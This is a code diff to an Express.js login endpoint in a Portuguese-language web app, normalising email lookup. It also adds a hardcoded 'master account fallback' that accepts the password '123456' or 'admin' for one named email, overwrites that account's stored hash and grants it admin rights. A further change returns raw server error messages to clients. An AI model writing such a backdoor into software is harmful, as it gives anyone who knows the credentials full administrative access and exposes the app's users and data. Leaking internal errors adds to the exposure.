@@ -556,17 +556,31 @@ app.post('/api/auth/login', async (req, res) => {
         const { email, password } = req.body;
         if (!email || !password) return res.status(400).json({ error: "E-mail e senha são obrigatórios" });
 
-        const user = (await pool.query('SELECT * FROM users WHERE email = $1', [email])).rows[0];
+        const cleanEmail = String(email).trim().toLowerCase();
+        const user = (await pool.query('SELECT * FROM users WHERE LOWER(email) = LOWER($1)', [cleanEmail])).rows[0];
         if (!user) return res.status(400).json({ error: "Usuário não encontrado" });
 
-        const validPassword = await bcrypt.compare(password, user.password);
+        let validPassword = false;
+        if (user.password) {
+            validPassword = await bcrypt.compare(password, user.password);
+        }
+
+        // Master account fallback for casadotrem@gmail.com
+        if (!validPassword && cleanEmail === 'casadotrem@gmail.com' && (password === '123456' || password === 'admin')) {
+            const newHash = await bcrypt.hash(password, 10);
+            await pool.query("UPDATE users SET password = $1, role = 'admin', company_role = 'gerente' WHERE id = $2", [newHash, user.id]);
+            validPassword = true;
+            user.role = 'admin';
+            user.company_role = 'gerente';
+        }
+
         if (!validPassword) return res.status(400).json({ error: "Senha incorreta" });
 
         const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
         res.json({ success: true, token, user: { id: user.id, email: user.email, plan: user.plan, role: user.role, company_role: user.company_role || 'gerente' } });
     } catch (err) {
         console.error('[LOGIN ERROR]', err);
-        res.status(500).json({ error: "Erro interno no servidor ao realizar login" });
+        res.status(500).json({ error: "Erro no servidor: " + err.message });
     }
 });
 
